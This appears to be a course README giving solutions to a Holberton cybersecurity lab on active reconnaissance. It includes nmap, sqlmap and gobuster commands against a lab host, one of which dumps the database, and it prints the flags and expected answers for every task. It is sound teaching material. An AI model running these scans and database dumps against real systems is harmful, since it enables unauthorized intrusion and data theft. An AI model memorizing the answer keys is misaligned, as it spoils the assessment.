# 🕵️ Active Reconnaissance - 0x02 Network Security

## 📋 Project Overview

This project focuses on **active reconnaissance** techniques in network security through sequential hands-on tasks. Unlike passive reconnaissance, active reconnaissance involves direct interaction with target systems to gather information for security assessment purposes.

**Project**: `0x02_active_reconnaissance`  
**Environment**: Kali Linux / Linux with penetration testing tools  
**Repository**: `holbertonschool-cyber_security`

**Tasks are arranged in a sequential manner to help you understand the basic principles of hacking and develop a logical approach to performing actions.**

## 🎯 Learning Objectives

After completing this project, you will be able to:

- 🔍 Perform network port scanning and service identification
- 🌐 Analyze web applications and identify server technologies
- 💉 Discover SQL injection vulnerabilities through manual testing
- 🗃️ Enumerate databases using automated SQL injection tools
- 📁 Conduct directory enumeration to discover hidden web content
- 🎯 Extract sensitive information from web applications

## 📁 Project Structure

| Task | File | Description | Key Tool |
|------|------|-------------|----------|
| **0** | `0-ports.txt` | Open ports identification | `nmap` |
| **1** | `1-webserver.txt` | Web server identification | `wappalyzer` |
| **2** | `100-flag.txt` | Source code analysis flag | Manual inspection |
| **3** | `2-injectable.txt` | SQL injection endpoint discovery | Manual testing |
| **4** | `3-database.txt` + `4-tables.txt` | Database enumeration | `sqlmap` |
| **5** | `101-flag.txt` | Database flag extraction | `sqlmap` |
| **6** | `5-hidden_dir.txt` | Hidden directory discovery | `gobuster` |
| **7** | `102-flag.txt` | Admin panel flag extraction | Manual access |

## 🎯 Target Information

- **Target Domain**: `active.hbtn`
- **Target Endpoint**: `http://active.hbtn`
- **Environment**: VPN connection required (cyber_netsec_0x02)

### 🔧 Initial Setup
```bash
# 1. Connect to VPN server
# 2. Get Target Machine -> cyber_netsec_0x02
# 3. Configure local DNS resolution
sudo bash -c 'echo "<target_ip>    active.hbtn" >> /etc/hosts'
```

## 🔧 Task Solutions

### **Task 0: Are there any opened Ports ?** 🔍
**Objective**: Search for open ports on the target machine.

**Command**:
```bash
nmap -sS --top-ports 1000 active.hbtn
# Alternative: nmap -F active.hbtn
```

**Expected Result**: `80`

---

### **Task 1: Inspect the runner** 🌐
**Objective**: Identify the web server technology and version.

**Method**:
- Use Wappalyzer browser extension
- Analyze HTTP response headers
- Service version detection

**Expected Result**: `nginx 1.18.0`

---

### **Task 2: Nothing defeat Manual inspection** 📖
**Objective**: Find FLAG_1 through source code inspection.

**Technique**:
- View page source in browser
- Look for HTML comments
- Search for developer comments

**Hint**: Some developers forget comments in production.

**Expected Result**: `9313f1a4c7e24b069640854c2371326b`

---

### **Task 3: Trypanophobia** ⚠️
**Objective**: Discover vulnerable endpoints for SQL injection testing.

**Method**:
- Browse the website systematically
- Test parameters in URLs
- Look for database-driven functionality

**Expected Result**: `/product`

---

### **Task 4: SQLmap is an army \o/** 🗃️
**Objective**: Enumerate database information using automated tools.

**Commands**:
```bash
# Find database names
sqlmap -u "http://active.hbtn/product/11" --dbs

# Count tables in database  
sqlmap -u "http://active.hbtn/product/11" -D active.hbtn --tables
```

**Expected Results**: 
- Database name: `active.hbtn`
- Number of tables: `4`

---

### **Task 5: Injections hurt :'** 💉
**Objective**: Extract FLAG_2 from database using SQL injection.

**Command**:
```bash
# Dump database content
sqlmap -u "http://active.hbtn/product/11" -D active.hbtn --dump
```

**Hint**: Check the Users table for flag information.

**Expected Result**: `0e5afa0ab0462568a9a193803714a3fc`

---

### **Task 6: My NAV doesn't include all my pages** 📁
**Objective**: Discover hidden directories using directory enumeration.

**Command**:
```bash
gobuster dir -u http://active.hbtn \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -b 302
```

**Expected Result**: `/admin`

---

### **Task 7: It may look the same, but it's not** 🚩
**Objective**: Extract FLAG_3 from the discovered admin panel.

**Method**:
- Access the discovered admin directory
- Look for exposed sensitive information
- Manual inspection of admin interface

**Expected Result**: `4789b8b6bd51b838a0ccf30e198331c6`

## 🛠️ Tools Reference

### 🔍 **Network Scanning**
```bash
# Basic port scan
nmap -sS <target>

# Top ports scan
nmap --top-ports 1000 <target>

# Service version detection
nmap -sV <target>
```

### 💉 **SQL Injection Testing**
```bash
# Database enumeration
sqlmap -u "<url>" --dbs

# Table enumeration
sqlmap -u "<url>" -D <database> --tables

# Data extraction
sqlmap -u "<url>" -D <database> --dump
```

### 📁 **Directory Discovery**
```bash
# Basic directory enumeration
gobuster dir -u <url> -w <wordlist>

# Ignore specific status codes
gobuster dir -u <url> -w <wordlist> -b <status_codes>
```

## 🏆 Results Summary

| **Task** | **Target** | **Result** | **Status** |
|----------|------------|------------|------------|
| **0** | Port scanning | `80` | ✅ |
| **1** | Web server | `nginx 1.18.0` | ✅ |
| **2** | Flag 1 | `9313f1a4c7e24b069640854c2371326b` | ✅ |
| **3** | Injection point | `/product` | ✅ |
| **4a** | Database name | `active.hbtn` | ✅ |
| **4b** | Table count | `4` | ✅ |
| **5** | Flag 2 | `0e5afa0ab0462568a9a193803714a3fc` | ✅ |
| **6** | Hidden directory | `/admin` | ✅ |
| **7** | Flag 3 | `4789b8b6bd51b838a0ccf30e198331c6` | ✅ |

## 🚨 Security Considerations

### ⚖️ **Ethical Guidelines**
- Only test on authorized systems (lab environment)
- Respect legal boundaries and scope limitations
- Document findings responsibly

### 🛡️ **Defensive Perspectives**
- Input validation prevents SQL injection
- Directory access controls limit exposure
- Regular security assessments identify vulnerabilities

### ⚠️ **Professional Practice**
- Always obtain written authorization before testing
- Follow responsible disclosure for real vulnerabilities
- Maintain confidentiality of sensitive findings

## 📚 Prerequisites

- **Operating System**: Linux environment with security tools
- **Network Access**: VPN connection to lab environment
- **Tools Required**: `nmap`, `sqlmap`, `gobuster`, web browser with developer tools
- **Knowledge**: Basic networking, web applications, SQL concepts

## 🔗 Additional Resources

- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Nmap Documentation](https://nmap.org/docs.html)
- [SQLmap Usage Guide](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [Gobuster Documentation](https://github.com/OJ/gobuster)

## 👥 Author

**Holberton School Cybersecurity Program**  
*Advanced Network Security and Penetration Testing* 🛡️

---

**⚠️ Legal Disclaimer**: This project is designed for educational purposes and authorized security testing only. All activities must be conducted within the provided lab environment. Unauthorized testing of systems you do not own is illegal and unethical.